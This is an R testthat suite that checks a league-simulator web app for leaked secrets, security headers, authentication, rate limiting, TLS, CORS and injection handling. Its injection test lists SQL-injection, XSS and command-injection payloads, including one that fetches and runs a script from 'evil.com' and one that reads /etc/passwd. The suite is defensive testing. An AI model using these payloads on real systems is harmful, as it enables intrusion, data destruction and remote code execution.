# Security Validation Tests
# Ensures application meets security requirements

library(testthat)
library(httr)
library(jsonlite)

# Source infrastructure
source("../deployment/test_infrastructure.R")

context("Security validation and compliance")

test_that("No secrets exposed in logs or responses", {
  skip_if_not(Sys.getenv("TEST_SECURITY", "FALSE") == "TRUE",
              "Security testing disabled")
  
  base_url <- test_infrastructure_exports$config$production_url
  
  # Define sensitive patterns to check
  sensitive_patterns <- c(
    # API Keys
    "RAPIDAPI_KEY", "rapidapi", "api[_-]?key", "apikey",
    # Secrets
    "SHINYAPPS_IO_SECRET", "secret", "password", "passwd", "pwd",
    # Tokens
    "token", "bearer", "jwt", "auth[_-]?token",
    # Database
    "db[_-]?pass", "database[_-]?password", "connection[_-]?string",
    # Private keys
    "private[_-]?key", "priv[_-]?key", "-----BEGIN"
  )
  
  # Test various endpoints
  test_endpoints <- c(
    "/api/status",
    "/api/config",
    "/api/info",
    "/health",
    "/metrics",
    "/api/debug"  # Should not exist in production
  )
  
  for (endpoint in test_endpoints) {
    response <- tryCatch({
      GET(paste0(base_url, endpoint))
    }, error = function(e) NULL)
    
    if (!is.null(response)) {
      # Check response body
      response_text <- content(response, as = "text", encoding = "UTF-8")
      
      for (pattern in sensitive_patterns) {
        expect_false(grepl(pattern, response_text, ignore.case = TRUE),
                    info = sprintf("Pattern '%s' found in %s response", pattern, endpoint))
      }
      
      # Check response headers
      headers <- headers(response)
      header_text <- paste(names(headers), headers, collapse = " ")
      
      for (pattern in sensitive_patterns) {
        expect_false(grepl(pattern, header_text, ignore.case = TRUE),
                    info = sprintf("Pattern '%s' found in %s headers", pattern, endpoint))
      }
    }
  }
  
  # Check application logs (if accessible)
  if (Sys.which("kubectl") != "") {
    log_output <- system2(
      "kubectl",
      args = c("logs", "-l", "app=league-simulator", "-n", "production",
               "--tail=1000", "--since=1h"),
      stdout = TRUE,
      stderr = TRUE
    )
    
    if (attr(log_output, "status") == 0) {
      log_text <- paste(log_output, collapse = "\n")
      
      for (pattern in sensitive_patterns) {
        expect_false(grepl(pattern, log_text, ignore.case = TRUE),
                    info = sprintf("Pattern '%s' found in application logs", pattern))
      }
    }
  }
})

test_that("Security headers are properly configured", {
  skip_if_not(Sys.getenv("TEST_SECURITY_HEADERS", "FALSE") == "TRUE",
              "Security header testing disabled")
  
  base_url <- test_infrastructure_exports$config$production_url
  
  # Make request to test headers
  response <- GET(paste0(base_url, "/"))
  response_headers <- headers(response)
  
  # Required security headers
  required_headers <- list(
    "x-content-type-options" = "nosniff",
    "x-frame-options" = c("DENY", "SAMEORIGIN"),
    "x-xss-protection" = "1; mode=block",
    "strict-transport-security" = "max-age=",
    "referrer-policy" = c("no-referrer", "strict-origin-when-cross-origin"),
    "permissions-policy" = "geolocation=(), microphone=(), camera=()"
  )
  
  for (header_name in names(required_headers)) {
    header_value <- response_headers[[header_name]]
    expected_values <- required_headers[[header_name]]
    
    expect_true(!is.null(header_value),
                info = sprintf("Security header '%s' is missing", header_name))
    
    if (!is.null(header_value)) {
      # Check if header value matches expected pattern
      matched <- FALSE
      for (expected in expected_values) {
        if (grepl(expected, header_value, ignore.case = TRUE)) {
          matched <- TRUE
          break
        }
      }
      
      expect_true(matched,
                  info = sprintf("Header '%s' has unexpected value: %s", 
                               header_name, header_value))
    }
  }
  
  # Check for headers that should NOT be present
  forbidden_headers <- c(
    "server",  # Don't expose server version
    "x-powered-by",  # Don't expose technology
    "x-aspnet-version"
  )
  
  for (header_name in forbidden_headers) {
    expect_null(response_headers[[header_name]],
                info = sprintf("Header '%s' should not be exposed", header_name))
  }
})

test_that("Authentication and authorization work correctly", {
  skip_if_not(Sys.getenv("TEST_AUTH", "FALSE") == "TRUE",
              "Authentication testing disabled")
  
  base_url <- test_infrastructure_exports$config$production_url
  
  # Test unauthorized access to protected endpoints
  protected_endpoints <- c(
    "/api/admin/config",
    "/api/admin/users",
    "/api/admin/logs",
    "/api/internal/debug"
  )
  
  for (endpoint in protected_endpoints) {
    # Request without authentication
    unauth_response <- GET(paste0(base_url, endpoint))
    
    # Should return 401 or 403
    expect_true(status_code(unauth_response) %in% c(401, 403),
                info = sprintf("Endpoint %s should require authentication (got %d)",
                             endpoint, status_code(unauth_response)))
    
    # Try with invalid token
    invalid_response <- GET(
      paste0(base_url, endpoint),
      add_headers(Authorization = "Bearer invalid-token-12345")
    )
    
    expect_true(status_code(invalid_response) %in% c(401, 403),
                info = sprintf("Endpoint %s should reject invalid tokens", endpoint))
  }
  
  # Test rate limiting
  rate_limit_endpoint <- paste0(base_url, "/api/simulate")
  
  # Make rapid requests
  request_times <- numeric(20)
  for (i in 1:20) {
    start_time <- Sys.time()
    response <- POST(rate_limit_endpoint, 
                    body = list(league = "test", iterations = 10),
                    encode = "json")
    request_times[i] <- as.numeric(Sys.time() - start_time, units = "secs")
    
    # Check for rate limit headers
    if (i > 15) {  # After many requests
      rate_limit_headers <- c("x-ratelimit-limit", "x-ratelimit-remaining", 
                             "x-ratelimit-reset")
      
      for (header in rate_limit_headers) {
        if (header %in% names(headers(response))) {
          expect_true(TRUE, info = sprintf("Rate limit header %s present", header))
        }
      }
      
      # Check if we're being rate limited
      if (status_code(response) == 429) {
        expect_true(TRUE, info = "Rate limiting is working (429 response)")
        break
      }
    }
  }
})

test_that("Input validation prevents injection attacks", {
  skip_if_not(Sys.getenv("TEST_INJECTION", "FALSE") == "TRUE",
              "Injection testing disabled")
  
  base_url <- test_infrastructure_exports$config$production_url
  
  # Test SQL injection attempts
  sql_injection_payloads <- c(
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT * FROM passwords --",
    "admin'--",
    "' OR 1=1#"
  )
  
  for (payload in sql_injection_payloads) {
    response <- POST(
      paste0(base_url, "/api/simulate"),
      body = list(
        league = payload,
        iterations = 100
      ),
      encode = "json"
    )
    
    # Should return 400 (bad request) not 500 (server error)
    expect_equal(status_code(response), 400,
                 info = sprintf("SQL injection attempt should be rejected: %s", payload))
    
    # Response should not contain database error details
    if (status_code(response) != 200) {
      error_body <- content(response, as = "text")
      expect_false(grepl("SQL|database|query", error_body, ignore.case = TRUE),
                   info = "Error response should not expose database details")
    }
  }
  
  # Test XSS attempts
  xss_payloads <- c(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(\"XSS\")'>"
  )
  
  for (payload in xss_payloads) {
    response <- POST(
      paste0(base_url, "/api/data/comment"),
      body = list(comment = payload),
      encode = "json"
    )
    
    if (status_code(response) == 200) {
      # If accepted, check that it's properly escaped in response
      response_body <- content(response, as = "text")
      expect_false(grepl(payload, response_body),
                   info = "XSS payload should be escaped in response")
      
      # Check for HTML encoding
      expect_true(grepl("&lt;|&gt;|&quot;|&#", response_body),
                  info = "Response should contain HTML-encoded content")
    }
  }
  
  # Test command injection
  cmd_injection_payloads <- c(
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$( curl evil.com/shell.sh | sh )"
  )
  
  for (payload in cmd_injection_payloads) {
    response <- GET(
      paste0(base_url, "/api/export"),
      query = list(filename = payload)
    )
    
    expect_true(status_code(response) %in% c(400, 403),
                info = sprintf("Command injection should be blocked: %s", payload))
  }
})

test_that("HTTPS and TLS configuration is secure", {
  skip_if_not(Sys.getenv("TEST_TLS", "FALSE") == "TRUE",
              "TLS testing disabled")
  skip_if_not(grepl("^https://", test_infrastructure_exports$config$production_url),
              "Production URL is not HTTPS")
  
  # Test SSL/TLS configuration using openssl
  if (Sys.which("openssl") != "") {
    url_parts <- parse_url(test_infrastructure_exports$config$production_url)
    host <- url_parts$hostname
    port <- ifelse(is.null(url_parts$port), 443, url_parts$port)
    
    # Check SSL certificate
    ssl_check <- system2(
      "openssl",
      args = c("s_client", "-connect", paste0(host, ":", port),
               "-servername", host, "-brief"),
      input = "",
      stdout = TRUE,
      stderr = TRUE
    )
    
    ssl_output <- paste(ssl_check, collapse = "\n")
    
    # Check for weak protocols
    expect_false(grepl("SSLv2|SSLv3|TLSv1\\.0", ssl_output),
                 info = "Weak SSL/TLS protocols should be disabled")
    
    # Check for strong protocols
    expect_true(grepl("TLSv1\\.[23]", ssl_output),
                info = "Strong TLS protocols should be enabled")
    
    # Check cipher strength
    cipher_check <- system2(
      "openssl",
      args = c("s_client", "-connect", paste0(host, ":", port),
               "-cipher", "HIGH:!aNULL:!MD5", "-brief"),
      input = "",
      stdout = TRUE,
      stderr = TRUE
    )
    
    # Should connect with strong ciphers
    expect_true(any(grepl("Cipher is", cipher_check)),
                info = "Should support strong ciphers")
  }
  
  # Test HTTP to HTTPS redirect
  http_url <- gsub("^https://", "http://", test_infrastructure_exports$config$production_url)
  
  redirect_response <- tryCatch({
    GET(http_url, follow_redirects = FALSE)
  }, error = function(e) NULL)
  
  if (!is.null(redirect_response)) {
    expect_true(status_code(redirect_response) %in% c(301, 302, 307, 308),
                info = "HTTP should redirect to HTTPS")
    
    location_header <- headers(redirect_response)$location
    expect_true(grepl("^https://", location_header),
                info = "Redirect should be to HTTPS URL")
  }
})

test_that("CORS policy is properly configured", {
  skip_if_not(Sys.getenv("TEST_CORS", "FALSE") == "TRUE",
              "CORS testing disabled")
  
  base_url <- test_infrastructure_exports$config$production_url
  
  # Test CORS preflight
  preflight_response <- tryCatch({
    VERB("OPTIONS", paste0(base_url, "/api/simulate"),
         add_headers(
           Origin = "https://evil.com",
           "Access-Control-Request-Method" = "POST",
           "Access-Control-Request-Headers" = "Content-Type"
         ))
  }, error = function(e) NULL)
  
  if (!is.null(preflight_response)) {
    cors_headers <- headers(preflight_response)
    
    # Check CORS headers
    if ("access-control-allow-origin" %in% names(cors_headers)) {
      allowed_origin <- cors_headers$`access-control-allow-origin`
      
      # Should not allow arbitrary origins
      expect_false(allowed_origin == "*",
                   info = "CORS should not allow all origins")
      
      expect_false(allowed_origin == "https://evil.com",
                   info = "CORS should not allow untrusted origins")
    }
    
    # Check allowed methods
    if ("access-control-allow-methods" %in% names(cors_headers)) {
      allowed_methods <- cors_headers$`access-control-allow-methods`
      
      # Should only allow necessary methods
      expect_true(grepl("GET|POST", allowed_methods),
                  info = "CORS should allow GET/POST")
      
      expect_false(grepl("DELETE|TRACE|CONNECT", allowed_methods),
                   info = "CORS should not allow dangerous methods")
    }
  }
})

test_that("Security monitoring and logging is active", {
  skip_if_not(Sys.getenv("TEST_SECURITY_MONITORING", "FALSE") == "TRUE",
              "Security monitoring testing disabled")
  
  # Trigger security events and verify they're logged
  security_events <- list(
    failed_auth = list(
      action = function() {
        GET(paste0(test_infrastructure_exports$config$production_url, 
                  "/api/admin/config"),
            add_headers(Authorization = "Bearer fake-token"))
      },
      expected_log = "authentication.*failed|unauthorized.*access"
    ),
    rate_limit = list(
      action = function() {
        # Make many rapid requests
        for (i in 1:30) {
          GET(paste0(test_infrastructure_exports$config$production_url, "/api/status"))
        }
      },
      expected_log = "rate.*limit|too.*many.*requests"
    ),
    invalid_input = list(
      action = function() {
        POST(paste0(test_infrastructure_exports$config$production_url, "/api/simulate"),
             body = list(league = "'; DROP TABLE--", iterations = "not-a-number"),
             encode = "json")
      },
      expected_log = "invalid.*input|validation.*failed|suspicious.*activity"
    )
  )
  
  for (event_name in names(security_events)) {
    event <- security_events[[event_name]]
    
    # Record timestamp before event
    event_time <- Sys.time()
    
    # Trigger the security event
    tryCatch(event$action(), error = function(e) NULL)
    
    # Wait for logs to be written
    Sys.sleep(2)
    
    # Check if event was logged (if we have log access)
    if (Sys.which("kubectl") != "") {
      since_time <- format(event_time - 60, "%Y-%m-%dT%H:%M:%S")
      
      log_check <- system2(
        "kubectl",
        args = c("logs", "-l", "app=league-simulator", "-n", "production",
                 "--since-time", since_time),
        stdout = TRUE,
        stderr = TRUE
      )
      
      if (attr(log_check, "status") == 0) {
        log_text <- paste(log_check, collapse = "\n")
        
        expect_true(grepl(event$expected_log, log_text, ignore.case = TRUE),
                    info = sprintf("Security event '%s' should be logged", event_name))
      }
    }
  }
})